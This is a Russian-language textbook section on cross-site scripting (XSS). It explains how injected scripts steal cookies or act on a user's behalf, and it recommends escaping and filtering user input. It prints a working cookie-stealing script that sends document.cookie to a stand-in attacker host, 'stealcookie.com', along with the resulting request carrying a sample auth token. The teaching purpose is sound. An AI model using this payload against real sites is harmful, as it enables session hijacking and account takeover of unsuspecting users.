\section{Межсайтовый скриптинг}\index{атака!XSS}
\selectlanguage{russian}

Другой вид распространённых программных уязвимостей состоит в некорректной обработке данных, введённых пользователем. Типичные примеры~--- отсутствующее или неправильное экранирование специальных символов и полей (например, спецсимволы \texttt{<} и \texttt{>} HTML, кавычки, слэши \texttt{/}, \texttt{\textbackslash}) и отсутствующая или неправильная проверка введённых данных на допустимые значения (например, SQL-запрос к базе данных веб-ресурса вместо логина пользователя).

Межсайтовый скриптинг (Cross-Site Scripting, XSS) заключается во внедрении в веб-страницу злоумышленником $A$ исполняемого текстового скрипта, который будет исполнен браузером клиента $B$. Скрипт может быть на языках JavaScript, VBScript, ActiveX, HTML, Flash. Целью атаки является, как правило, доступ к информации клиента.

Скрипт может получить доступ к cookie-файлам данного сайта, например, с аутентификатором, вставить гиперссылки на свой сайт под видом доверенных ссылок. Вставленные гиперссылки могут содержать информацию пользователя.

Скрипт также может выполнить последовательность HTTP GET- и POST-запросов на веб-сайт для выполнения действий от имени пользователя. Например, вирусно распространить вредоносный JavaScript код со страницы одного пользователя на страницы всех друзей, друзей друзей и т.~д. и затем удалить все данные пользователя. Атака может привести к уничтожению социальной сети.

Приведём пример кражи cookie-файла веб-сайта, который имеет уязвимость на вставку текста, содержащего код, который будет исполнен браузером.

%Когда браузер первый раз обращается к сайту, веб-приложение может выслать вместе с HTML страницей cookie-файл, хранящий текстовую строку последовательностей

Например, пусть аутентификатор пользователя в cookie-файле сайта \texttt{myemail.com} содержит
\begin{center} \begin{verbatim}
auth=AJHVML43LDSL42SC6DF;
\end{verbatim} \end{center}

пусть текстовое сообщение, размещённое пользователем, содержит текстовый скрипт, помещающий на странице <<изображение>>, расположенное по некоему адресу.
\begin{verbatim}
<script>
  new Image().src = "http://stealcookie.com?c=" +
    encodeURI(document.cookie);
</script>
\end{verbatim}

Тогда браузер всех пользователей, которым показывается сообщение, при загрузке страницы отправит HTTP GET-запрос на получение файла <<изображения>> по адресу
\begin{center} \begin{verbatim}
http://stealcookie.com?auth=AJHVML43LDSL42SC6DF;
\end{verbatim} \end{center}

в результате злоумышленник получит cookie, используя который он может заходить на веб-сайт под видом пользователя.

Вставка гиперссылок является наиболее частой XSS-атакой. Иногда ссылки кодируются шестнадцатеричными числами вида \texttt{\%NN}, чтобы не вызывать сомнения у пользователя текстом ссылки.
%Браузер самостоятельно не может отослать данные на другой сайт, отличный от текущего, поэтому передаваемая информация содержится в гиперссылках.

%(например, JavaScript код), либо программным обеспечением, генерирующим HTML-страницу для выдачи клиенту $B$ (например, PHP код). Цель XSS атаки -- либо выполнение JavaScript кода браузером клиента, либо выполнение скриптового кода на веб-сервере при запросе клиента к нему.

%Простой пример -- вебфорум. Пользователи вводят в формы текстовые сообщения, которые запоминаются в БД и показываются другим пользователям. Страница форума генерируется каждый раз заново при запросе пользователей информационной системой. Генерирование часто происходит из шаблона страницы, который содержит и базовый статический HTML код страницы, и исполняемый код скрипта для вставки динамического содержания на основе запроса к базе данных. Как правило, злоумышленник пользуется во время генерирования страницы некорректным экранированием текста, введённого им в формах ввода текста вебстраницы, кавычек, слэшей. То есть, текстовые значения полей, которые сохраняются в базе данных веб-сайта и отображаются другим пользователям, содержат исполняемый код злоумышленника.

На 2009 г. 80\% обнаруженных уязвимостей веб-сайтов являются XSS-уязвимостями.

Стандартный способ защиты от XSS-атак заключается в фильтрации, замене, экранировании символов и слов введённого текста пользователем: \texttt{<}, \texttt{>}, \texttt{/}, \texttt{\textbackslash}, \texttt{"}, \texttt{'}, \texttt{(}, \texttt{)}, \texttt{script}, \texttt{javascript} и др., а также в обработке кодировок символов.
